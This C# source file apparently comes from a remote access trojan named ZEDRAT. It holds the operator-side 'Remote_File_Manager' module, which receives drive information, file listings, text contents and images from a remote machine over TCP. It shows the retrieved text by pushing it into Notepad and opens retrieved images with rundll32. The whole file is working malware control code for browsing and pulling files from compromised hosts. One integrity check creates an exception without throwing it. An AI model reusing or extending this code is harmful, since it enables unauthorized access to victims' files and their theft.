using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;
using ZEDRAT.TCP;

namespace ZEDRAT.Module
{
	public class Remote_File_Manager
	{
		public Action<string, object> _FormExecute;

		public Action<string, object> _DownLoadFormExecute;

		public TcpClientSession _tcs;

		public List<byte> RecvList = new List<byte>();

		public string GetIcon;

		public Remote_File_Manager(TcpClientSession tcs)
		{
			this._tcs = tcs;
		}

		public void RemoteFileExecute(TcpClientSession tcs, byte[] bt)
		{
			try
			{
				Remote_File_Messgaes remote_File_Messgaes = Remote_File_Messgaes.ByteToClass(bt);
				switch (remote_File_Messgaes.FileType)
				{
				case "Status":
					this._FormExecute("Status", Encoding.UTF8.GetString(remote_File_Messgaes.payload));
					break;
				case "DownLoadEnd":
					this._DownLoadFormExecute("DownLoadEnd", remote_File_Messgaes.payload);
					break;
				case "IconEnd":
					this.CheckingFilelist(remote_File_Messgaes.payload, "IconEnd");
					break;
				case "Begin":
					this.RecvList.AddRange(remote_File_Messgaes.payload);
					break;
				case "TxtEnd":
					this.CheckingFilelist(remote_File_Messgaes.payload, "TxtEnd");
					break;
				case "FileHead":
					this._DownLoadFormExecute("FileHead", remote_File_Messgaes.payload);
					break;
				case "FileListEnd":
					this.CheckingFilelist(remote_File_Messgaes.payload, "FileList");
					break;
				case "DriveInfo":
					this.GetDriveInfo(remote_File_Messgaes.payload);
					break;
				case "DownLoadBegin":
					this._DownLoadFormExecute("DownLoadBegin", remote_File_Messgaes.payload);
					break;
				}
			}
			catch (Exception ex)
			{
				this.RecvList?.Clear();
				this._FormExecute("Status", ex.Message);
			}
		}

		private void Remote_File_GetIcon(byte[] bt, string type)
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + this.GetIcon;
				using FileStream output = new FileStream(text, FileMode.Create);
				using BinaryWriter binaryWriter = new BinaryWriter(output);
				binaryWriter.Write(bt);
				using Process process = new Process();
				process.StartInfo.UseShellExecute = true;
				process.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
				process.StartInfo.FileName = "rundll32.exe";
				process.StartInfo.Arguments = " shimgvw.dll,ImageView_Fullscreen " + text;
				process.Start();
			}
			catch
			{
				throw;
			}
		}

		private void GetDriveInfo(byte[] bt)
		{
			try
			{
				this._FormExecute("DriveInfo", Encoding.UTF8.GetString(bt).Split('|'));
			}
			catch
			{
				throw;
			}
		}

		private void CheckingFilelist(byte[] payload, string type)
		{
			try
			{
				if (this.RecvList.Count != BitConverter.ToInt32(payload, 0))
				{
					new Exception();
				}
				if (type.Equals("FileList"))
				{
					this._FormExecute("FileList", Serializable.Deserialize(GZip.Decompress(this.RecvList.ToArray())) as List<RemoteFilesList>);
				}
				if (type.Equals("TxtEnd"))
				{
					this.Remote_File_GetTxt(Encoding.Default.GetString(GZip.Decompress(this.RecvList.ToArray())));
					this._FormExecute("Status", "Successful Operation");
				}
				if (type.Equals("IconEnd"))
				{
					this.Remote_File_GetIcon(GZip.Decompress(this.RecvList.ToArray()), "IconEnd");
					this._FormExecute("Status", "Successful Operation");
					this.GetIcon = null;
				}
				this.RecvList.Clear();
			}
			catch
			{
				throw;
			}
		}

		private void Remote_File_GetTxt(string text)
		{
			try
			{
				using Process process = Process.Start("notepad.exe");
				Thread.Sleep(2000);
				Remote_File_Manager.SendMessage(Remote_File_Manager.FindWindowEx(process.MainWindowHandle, IntPtr.Zero, "Edit", null), 12u, 0, text);
			}
			catch
			{
				throw;
			}
		}

		public void Remote_File_Send(string command, byte[] payload)
		{
			try
			{
				this._tcs.Client_Send(DataType.RemoteFileType, Remote_File_Messgaes.ClassToByte(new Remote_File_Messgaes(command, payload)));
			}
			catch
			{
				throw;
			}
		}

		public void destroy()
		{
			try
			{
				this.RecvList?.Clear();
			}
			catch
			{
			}
			finally
			{
				this.RecvList = null;
				this._FormExecute = null;
				this._tcs = null;
			}
		}

		[DllImport("User32.DLL")]
		public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, string lParam);

		[DllImport("User32.DLL")]
		public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
	}
}
